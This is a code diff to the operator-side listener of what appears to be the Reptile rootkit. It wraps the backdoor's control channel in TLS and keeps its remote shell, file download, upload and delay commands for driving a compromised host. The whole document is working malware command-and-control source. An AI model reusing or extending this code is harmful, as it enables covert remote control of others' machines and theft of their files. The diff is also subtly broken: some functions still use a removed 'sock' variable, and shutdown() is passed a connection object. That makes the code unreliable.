@@ -23,21 +23,34 @@
 #include "pel.h"
 #include "util.h"
 
+/* TODO(CMK): better option than simple compile-time paths? */
+#ifndef CERT_FILENAME
+#warning CERT_FILENAME must be defined as the path to the certificate pem
+#define CERT_FILENAME "/usr/my_certs/server-certificate.pem"
+#endif
+
+#ifndef PRIV_KEY_FILENAME
+#warning PRIV_KEY_FILENAME must be defined as the path to the private key pem
+#define PRIV_KEY_FILENAME "/usr/my_certs/server-private-key.pem"
+#endif
+
 extern char *optarg;
 unsigned char message[BUFSIZE + 1];
 char *password = NULL;
-int sockfd;
 pid_t pid;
 
-int help(int sock, char **args);
-int __exit(int sock, char **args);
-int shell(int sock, char **args);
-int get_file(int sock, char **args);
-int put_file(int sock, char **args);
-int delay(int sock, char **args);
+static openssl_ctx *m_openssl_server;
+static openssl_conn *m_openssl_client_conn;
+
+int help(openssl_conn *conn, char **args);
+int __exit(openssl_conn *conn, char **args);
+int shell(openssl_conn *conn, char **args);
+int get_file(openssl_conn *conn, char **args);
+int put_file(openssl_conn *conn, char **args);
+int delay(openssl_conn *conn, char **args);
 
 char *builtin_str[] = {"help", "download", "upload", "shell", "delay", "exit"};
-int (*builtin_func[])(int sock, char **) = {&help,  &get_file, &put_file,
+int (*builtin_func[])(openssl_conn *conn, char **) = {&help,  &get_file, &put_file,
 					    &shell, &delay,    &__exit};
 
 int num_builtins() { return sizeof(builtin_str) / sizeof(char *); }
@@ -100,7 +113,7 @@ void no_help()
 	fprintf(stdout, "This command doesn't need help\n");
 }
 
-int help(int sock, char **args)
+int help(openssl_conn *conn, char **args)
 {
 	if (args[0] == NULL && sock == -1)
 		return 1;
@@ -137,17 +150,28 @@ int help(int sock, char **args)
 	return 1;
 }
 
-int __exit(int sock, char **args)
+int __exit(openssl_conn *conn, char **args)
 {
 	if (args[0] == NULL && sock == -1)
 		return 1;
 
-	pel_send_msg(sock, (unsigned char *)EXIT, EXIT_LEN);
+	pel_send_msg(conn, (unsigned char *)EXIT, EXIT_LEN);
+	
+	if (m_openssl_server) {
+		openssl_ctx_delete(m_openssl_server);
+		m_openssl_server = NULL;
+	}
+
+	if (m_openssl_client_conn) {
+		openssl_conn_delete(m_openssl_client_conn);
+		m_openssl_client_conn = NULL;
+	}
+
 	fprintf(stdout, "\n");
 	return 0;
 }
 
-int shell(int sock, char **args)
+int shell(openssl_conn *conn, char **args)
 {
 	fd_set rd;
 	char *term, *temp;
@@ -155,7 +179,7 @@ int shell(int sock, char **args)
 	struct winsize ws;
 	struct termios tp, tr;
 
-	if (args[0] == NULL && sock == -1)
+	if (args[0] == NULL && conn == NULL)
 		return 1;
 
 	term = getenv("TERM");
@@ -165,7 +189,7 @@ int shell(int sock, char **args)
 
 	len = strlen(term);
 
-	ret = pel_send_msg(sock, (unsigned char *)term, len);
+	ret = pel_send_msg(conn, (unsigned char *)term, len);
 
 	if (ret != PEL_SUCCESS) {
 		pel_error("pel_send_msg");
@@ -191,7 +215,7 @@ int shell(int sock, char **args)
 	message[2] = (ws.ws_col >> 8) & 0xFF;
 	message[3] = (ws.ws_col) & 0xFF;
 
-	ret = pel_send_msg(sock, message, 4);
+	ret = pel_send_msg(conn, message, 4);
 
 	if (ret != PEL_SUCCESS) {
 		pel_error("pel_send_msg");
@@ -241,7 +265,7 @@ int shell(int sock, char **args)
 	}
 
 	len = strlen(temp);
-	ret = pel_send_msg(sock, (unsigned char *)temp, len);
+	ret = pel_send_msg(conn, (unsigned char *)temp, len);
 	free(temp);
 
 	if (ret != PEL_SUCCESS) {
@@ -273,21 +297,23 @@ int shell(int sock, char **args)
 		}
 	}
 
+	int conn_fd = openssl_get_fd(conn);
+
 	while (1) {
 		FD_ZERO(&rd);
 
 		if (imf != 0)
 			FD_SET(0, &rd);
 
-		FD_SET(sock, &rd);
+		FD_SET(conn_fd, &rd);
 
-		if (select(sock + 1, &rd, NULL, NULL, NULL) < 0) {
+		if (select(conn_fd + 1, &rd, NULL, NULL, NULL) < 0) {
 			p_error("select");
 			break;
 		}
 
-		if (FD_ISSET(sock, &rd)) {
-			ret = pel_recv_msg(sock, message, &len);
+		if (FD_ISSET(conn_fd, &rd)) {
+			ret = pel_recv_msg(conn, message, &len);
 
 			if (ret != PEL_SUCCESS) {
 				pel_error("pel_recv_msg");
@@ -319,7 +345,7 @@ int shell(int sock, char **args)
 				break;
 			}
 
-			ret = pel_send_msg(sock, message, len);
+			ret = pel_send_msg(conn, message, len);
 
 			if (ret != PEL_SUCCESS) {
 				pel_error("pel_send_msg");
@@ -334,7 +360,7 @@ int shell(int sock, char **args)
 	return 1;
 }
 
-int get_file(int sock, char **args)
+int get_file(openssl_conn *conn, char **args)
 {
 	char *temp, *pathname;
 	int ret, len, fd, total;
@@ -343,7 +369,7 @@ int get_file(int sock, char **args)
 	if (args[1] == NULL || args[2] == NULL) {
 		fprintf(stderr, "%s wrong arguments\n\n", bad);
 
-		if (pel_send_msg(sock, &out, 1) != PEL_SUCCESS)
+		if (pel_send_msg(conn, &out, 1) != PEL_SUCCESS)
 			pel_error("pel_send_msg");
 
 		return 1;
@@ -351,7 +377,7 @@ int get_file(int sock, char **args)
 
 	len = strlen(args[1]);
 
-	ret = pel_send_msg(sock, (unsigned char *)args[1], len);
+	ret = pel_send_msg(conn, (unsigned char *)args[1], len);
 
 	if (ret != PEL_SUCCESS) {
 		pel_error("pel_send_msg");
@@ -391,7 +417,7 @@ int get_file(int sock, char **args)
 	total = 0;
 
 	while (1) {
-		ret = pel_recv_msg(sock, message, &len);
+		ret = pel_recv_msg(conn, message, &len);
 
 		if (ret != PEL_SUCCESS) {
 			pel_error("pel_recv_msg");
@@ -418,7 +444,7 @@ int get_file(int sock, char **args)
 	return 1;
 }
 
-int put_file(int sock, char **args)
+int put_file(openssl_conn *conn, char **args)
 {
 	char *temp, *pathname;
 	int ret, len, fd, total;
@@ -427,7 +453,7 @@ int put_file(int sock, char **args)
 	if (args[1] == NULL || args[2] == NULL) {
 		fprintf(stderr, "%s wrong arguments\n\n", bad);
 
-		if (pel_send_msg(sock, &out, 1) != PEL_SUCCESS)
+		if (pel_send_msg(conn, &out, 1) != PEL_SUCCESS)
 			pel_error("pel_send_msg");
 
 		return 1;
@@ -455,7 +481,7 @@ int put_file(int sock, char **args)
 
 	len = strlen(pathname);
 
-	ret = pel_send_msg(sock, (unsigned char *)pathname, len);
+	ret = pel_send_msg(conn, (unsigned char *)pathname, len);
 
 	free(pathname);
 
@@ -485,7 +511,7 @@ int put_file(int sock, char **args)
 			break;
 		}
 
-		ret = pel_send_msg(sock, message, len);
+		ret = pel_send_msg(conn, message, len);
 
 		if (ret != PEL_SUCCESS) {
 			pel_error("pel_send_msg");
@@ -499,13 +525,13 @@ int put_file(int sock, char **args)
 		fflush(stdout);
 	}
 
-	pel_send_msg(sock, (unsigned char *)EXIT, EXIT_LEN);
+	pel_send_msg(conn, (unsigned char *)EXIT, EXIT_LEN);
 
 	printf("%s %d done.\n\n", good, total);
 	return 1;
 }
 
-int delay(int sock, char **args)
+int delay(openssl_conn *conn, char **args)
 {
 	int ret, flag;
 	unsigned int i, j;
@@ -515,7 +541,7 @@ int delay(int sock, char **args)
 	if (args[1] == NULL) {
 		fprintf(stderr, "%s no arguments\n\n", bad);
 
-		if (pel_send_msg(sock, &out, 1) != PEL_SUCCESS)
+		if (pel_send_msg(conn, &out, 1) != PEL_SUCCESS)
 			pel_error("pel_send_msg");
 
 		return 1;
@@ -532,14 +558,14 @@ int delay(int sock, char **args)
 		if (flag == 0) {
 			fprintf(stderr, "%s wrong argument\n\n", bad);
 
-			if (pel_send_msg(sock, &out, 1) != PEL_SUCCESS)
+			if (pel_send_msg(conn, &out, 1) != PEL_SUCCESS)
 				pel_error("pel_send_msg");
 
 			return 1;
 		}
 	}
 
-	ret = pel_send_msg(sock, (unsigned char *)args[1], strlen(args[1]));
+	ret = pel_send_msg(conn, (unsigned char *)args[1], strlen(args[1]));
 
 	if (ret != PEL_SUCCESS) {
 		pel_error("pel_send_msg");
@@ -550,40 +576,40 @@ int delay(int sock, char **args)
 	return 1;
 }
 
-int execute(int sock, char **args)
+int execute(openssl_conn *conn, char **args)
 {
 	int i, ret;
 
-	if (args[0] == NULL || sock == -1)
+	if (args[0] == NULL || conn == NULL)
 		return 1;
 
 	for (i = 0; i < num_builtins(); i++) {
 		if (strcmp(args[0], builtin_str[i]) == 0) {
 			if (i == 0) {
-				return (*builtin_func[i])(sock, args);
+				return (*builtin_func[i])(conn, args);
 			} else {
 				ret =
-				    pel_send_msg(sock, (unsigned char *)&i, 1);
+				    pel_send_msg(conn, (unsigned char *)&i, 1);
 
 				if (ret != PEL_SUCCESS) {
 					pel_error("pel_send_msg");
 					return 1;
 				}
 
-				return (*builtin_func[i])(sock, args);
+				return (*builtin_func[i])(conn, args);
 			}
 		}
 	}
 
 	i = 3;
-	ret = pel_send_msg(sock, (unsigned char *)&i, 1);
+	ret = pel_send_msg(conn, (unsigned char *)&i, 1);
 
 	if (ret != PEL_SUCCESS) {
 		pel_error("pel_send_msg");
 		return 1;
 	}
 
-	return (*builtin_func[3])(sock, args);
+	return (*builtin_func[3])(conn, args);
 }
 
 char *read_line(void)
@@ -657,7 +683,7 @@ char **parse(char *line)
 	return tokens;
 }
 
-void reptile_loop(int sock)
+void reptile_loop(openssl_conn *conn)
 {
 	char *line;
 	char **args;
@@ -668,7 +694,7 @@ void reptile_loop(int sock)
 		add_history(line);
 
 		args = parse(line);
-		status = execute(sock, args);
+		status = execute(conn, args);
 
 		free(line);
 		free(args);
@@ -679,7 +705,16 @@ void reptile_loop(int sock)
 
 void handle_shutdown(int signal)
 {
-	close(sockfd);
+	if (m_openssl_server) {
+		openssl_ctx_delete(m_openssl_server);
+		m_openssl_server = NULL;
+	}
+
+	if (m_openssl_client_conn) {
+		openssl_conn_delete(m_openssl_client_conn);
+		m_openssl_client_conn = NULL;
+	}
+
 	exit(signal);
 }
 
@@ -688,53 +723,33 @@ void listener(int port)
 	int new_sockfd, yes = 1;
 	struct sockaddr_in host_addr, client_addr;
 	socklen_t sin_size;
-
-	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
+	
+	/* Step 1: create the OpenSSL context and initialize a TLS server. */
+	m_openssl_server = openssl_ctx_new();
+	if (!m_openssl_server) {
 		kill(pid, SIGQUIT);
-		fatal("in socket");
+		fatal("openssl_ctx_new");
 	}
 
-	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) ==
-	    -1) {
+	if (!openssl_server_init(m_openssl_server, port, CERT_FILENAME, PRIV_KEY_FILENAME)) {
 		kill(pid, SIGQUIT);
-		close(sockfd);
-		fatal("setting socket option SO_REUSEADDR");
+		openssl_ctx_delete(m_openssl_server);
+		m_openssl_server = NULL;
+		fatal("openssl_server_init");
 	}
 
-	signal(SIGTERM, handle_shutdown);
-	signal(SIGINT, handle_shutdown);
-
-	host_addr.sin_family = AF_INET;
-	host_addr.sin_port = htons(port);
-	host_addr.sin_addr.s_addr = INADDR_ANY;
-	memset(&(host_addr.sin_zero), '\0', 8);
-
-	if (bind(sockfd, (struct sockaddr *)&host_addr,
-		 sizeof(struct sockaddr)) == -1) {
+	/* Step 2: accept the incoming connection. */
+	m_openssl_client_conn = openssl_server_accept(m_openssl_server);
+	if (!m_openssl_client_conn) {
 		kill(pid, SIGQUIT);
-		close(sockfd);
-		fatal("binding to socket");
+		openssl_ctx_delete(m_openssl_server);
+		m_openssl_server = NULL;
+		fatal("openssl_server_accept");
 	}
 
-	if (listen(sockfd, 5) == -1) {
-		kill(pid, SIGQUIT);
-		close(sockfd);
-		fatal("listening on socket");
-	} else {
-		fprintf(stdout, "%s Listening on port %d...\n", good, port);
-	}
-
-	sin_size = sizeof(struct sockaddr_in);
-	new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
-
-	if (new_sockfd == -1) {
-		kill(pid, SIGQUIT);
-		close(sockfd);
-		fatal("accepting connection");
-	}
-
-	fprintf(stdout, "%s Connection from %s:%d\n\n", awesome,
-		inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
+	printf("%s Connection from %s:%s\n\n", awesome,
+		openssl_get_peer_name(m_openssl_client_conn), 
+		openssl_get_peer_port(m_openssl_client_conn));
 
 	// usleep(100 * 1500);
 
@@ -743,17 +758,18 @@ void listener(int port)
 		fprintf(stdout, "\n");
 	}
 
-	if (pel_client_init(new_sockfd, password) != PEL_SUCCESS) {
-		close(new_sockfd);
+	if (pel_client_init(m_openssl_server, m_openssl_client_conn, password) != PEL_SUCCESS) {
+		openssl_ctx_delete(m_openssl_server);
+		openssl_conn_delete(m_openssl_client_conn);
 		fprintf(stdout, "%s wrong password!\n\n", bad);
 		exit(ERROR);
 	}
 
 	banner();
-	reptile_loop(new_sockfd);
+	reptile_loop(m_openssl_client_conn);
 
-	shutdown(new_sockfd, SHUT_RDWR);
-	close(sockfd);
+	shutdown(m_openssl_client_conn, SHUT_RDWR);
+	openssl_ctx_delete(m_openssl_server);
 }
 
 void usage(char *argv0)
